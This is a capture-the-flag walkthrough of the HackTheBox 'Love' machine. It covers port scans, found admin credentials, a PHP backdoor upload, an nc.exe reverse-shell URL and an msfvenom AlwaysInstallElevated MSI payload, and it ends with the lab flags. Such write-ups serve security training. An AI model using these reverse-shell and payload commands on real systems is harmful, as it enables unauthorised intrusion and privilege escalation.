# Love HacktheBox Walkthrough

## All Ports Scan
```bash
# Nmap 7.91 scan initiated Sat Jun 12 15:54:04 2021 as: nmap -T4 -sT -vv -p- -oA nmap/allports 10.10.10.239
Warning: 10.10.10.239 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.239
Host is up, received echo-reply ttl 127 (0.15s latency).
Scanned at 2021-06-12 15:54:04 EDT for 1723s
Not shown: 64909 closed ports, 607 filtered ports
Reason: 64909 conn-refused and 607 no-responses
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
443/tcp   open  https        syn-ack
445/tcp   open  microsoft-ds syn-ack
3306/tcp  open  mysql        syn-ack
5000/tcp  open  upnp         syn-ack
5040/tcp  open  unknown      syn-ack
5985/tcp  open  wsman        syn-ack
5986/tcp  open  wsmans       syn-ack
7680/tcp  open  pando-pub    syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jun 12 16:22:47 2021 -- 1 IP address (1 host up) scanned in 1723.26 seconds
```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Sat Jun 12 16:05:48 2021 as: nmap -T4 -sT -sC -sV -A -p445,139,443,135,3306,80,49670,5986,5000 -oA nmap/complete 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up (0.46s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
|_SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.48' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Issuer: commonName=LOVE
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-11T14:39:19
| Not valid after:  2024-04-10T14:39:19
| MD5:   d35a 2ba6 8ef4 7568 f99d d6f4 aaa2 03b5
|_SHA-1: 84ef d922 a70a 6d9d 82b8 5bb3 d04f 066b 12f8 6e73
|_ssl-date: 2021-06-12T10:58:52+00:00; -9h08m30s from scanner time.
| tls-alpn: 
|_  http/1.1
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=6/12%Time=60C5139E%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.48'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (94%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1703 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows 8 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 R2 (92%), Microsoft Windows Server 2008 SP2 (92%), Microsoft Windows 8.1 Update 1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7h23m27s, deviation: 3h30m03s, median: -9h08m29s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-12T03:58:36-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-12T10:58:37
|_  start_date: N/A

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   153.46 ms 10.10.14.1
2   484.20 ms 10.10.10.239

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 12 16:07:23 2021 -- 1 IP address (1 host up) scanned in 94.86 seconds
```

## Port 80 Enumeration

While enumerating port 80 found 2 website running on different subdomain.

![](Images/Pasted%20image%2020210612161120.png)

![](Images/Pasted%20image%2020210612161053.png)

While enumerating subdomain. found admin credentials.

![](Images/Pasted%20image%2020210612161554.png)

```bash
Credentilas : 
Username : admin
Password : @LoveIsInTheAir!!!!
```

Let's search for panel.

```bash
/images               (Status: 301) [Size: 330] [--> http://love.htb/images/]
/Images               (Status: 301) [Size: 330] [--> http://love.htb/Images/]
/admin                (Status: 301) [Size: 329] [--> http://love.htb/admin/]
/plugins              (Status: 301) [Size: 331] [--> http://love.htb/plugins/]
/includes             (Status: 301) [Size: 332] [--> http://love.htb/includes/]
/examples             (Status: 503) [Size: 398]
/dist                 (Status: 301) [Size: 328] [--> http://love.htb/dist/]
/licenses             (Status: 403) [Size: 417]
/IMAGES               (Status: 301) [Size: 330] [--> http://love.htb/IMAGES/]
/%20                  (Status: 403) [Size: 298]
/Admin                (Status: 301) [Size: 329] [--> http://love.htb/Admin/]
/*checkout*           (Status: 403) [Size: 298]
/Plugins              (Status: 301) [Size: 331] [--> http://love.htb/Plugins/]
/phpmyadmin           (Status: 403) [Size: 298]
/webalizer            (Status: 403) [Size: 298]
/*docroot*            (Status: 403) [Size: 298]
/*                    (Status: 403) [Size: 298]
/con                  (Status: 403) [Size: 298]
/http%3A              (Status: 403) [Size: 298]
/Includes             (Status: 301) [Size: 332] [--> http://love.htb/Includes/]
/**http%3a            (Status: 403) [Size: 298]
/*http%3A             (Status: 403) [Size: 298]
/aux                  (Status: 403) [Size: 298]
/Dist                 (Status: 301) [Size: 328] [--> http://love.htb/Dist/]
/**http%3A            (Status: 403) [Size: 298]
/%C0                  (Status: 403) [Size: 298]
```
Logged in to the admin panel.

![](Images/Pasted%20image%2020210612161933.png)

And i uploaded a simple php backdoor on server.

![](Images/Pasted%20image%2020210612162215.png)

Now time to get the reverse shell i use nc.exe to get a reverse shell.

```bash
http://love.htb/images/simple-backdoor.php?cmd=C:\\xampp\\htdocs\\omrs\\images\nc.exe+10.10.14.48+443+-e+cmd.exe
```

And here we got a shell.

![](Images/Pasted%20image%2020210612162549.png)

## Previlege Escalation

```bash
Let's check for the always install elevated.

C:\xampp\htdocs\omrs\images>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\xampp\htdocs\omrs\images>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
And here we got the value is 1.

```java
# msfvenom --platform windows --arch x64 --payload windows/x64/shell\_reverse\_tcp LHOST=10.10.14.48 LPORT=1234 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi
```

![](Images/Pasted%20image%2020210612163910.png)

```bash
User Flag : 948c240539c0ba3feee2a368586411eb
Root Flag : ae89cfa6cf6444fa25efac87c07519d5
```